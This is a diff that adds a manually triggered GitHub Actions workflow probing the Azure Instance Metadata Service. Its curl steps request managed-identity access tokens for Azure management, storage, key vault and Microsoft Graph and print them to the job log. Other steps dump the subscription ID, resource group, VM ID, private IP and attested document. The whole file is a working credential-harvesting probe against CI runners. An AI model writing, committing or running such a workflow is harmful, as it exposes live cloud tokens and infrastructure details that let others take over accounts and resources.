@@ -1,0 +1,51 @@
+name: azure-imds-probe
+on:
+  workflow_dispatch:
+jobs:
+  imds-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe Azure IMDS for managed identity tokens
+        run: |
+          echo "=== Azure IMDS Instance Metadata ==="
+          IMDS="http://169.254.169.254/metadata"
+
+          echo ""
+          echo "=== Try managed identity token (default) ==="
+          curl -s -m 5 "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            -H "Metadata: true" | head -c 2000
+          echo ""
+
+          echo "=== Try managed identity token for storage ==="
+          curl -s -m 5 "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" \
+            -H "Metadata: true" | head -c 2000
+          echo ""
+
+          echo "=== Try managed identity token for key vault ==="
+          curl -s -m 5 "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.com/" \
+            -H "Metadata: true" | head -c 2000
+          echo ""
+
+          echo "=== Try managed identity token for graph ==="
+          curl -s -m 5 "$IMDS/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
+            -H "Metadata: true" | head -c 2000
+          echo ""
+
+          echo "=== Check IMDS identity endpoint ==="
+          curl -si -m 5 "$IMDS/identity?api-version=2018-02-01" \
+            -H "Metadata: true" | head -20
+          echo ""
+
+          echo "=== Full instance metadata (network/compute) ==="
+          curl -s -m 5 "$IMDS/instance?api-version=2021-02-01" \
+            -H "Metadata: true" | python3 -m json.tool 2>/dev/null | grep -E '"subscriptionId"|"resourceGroupName"|"vmId"|"location"|"vmSize"|"privateIpAddress"'
+          echo ""
+
+          echo "=== IMDS scheduled events ==="
+          curl -s -m 5 "$IMDS/scheduledevents?api-version=2019-08-01" \
+            -H "Metadata: true" | head -c 500
+          echo ""
+
+          echo "=== IMDS ATTESTED data (contains nonce) ==="
+          curl -s -m 5 "$IMDS/attested/document?api-version=2019-11-01&nonce=TESTPROBE" \
+            -H "Metadata: true" | head -c 1000
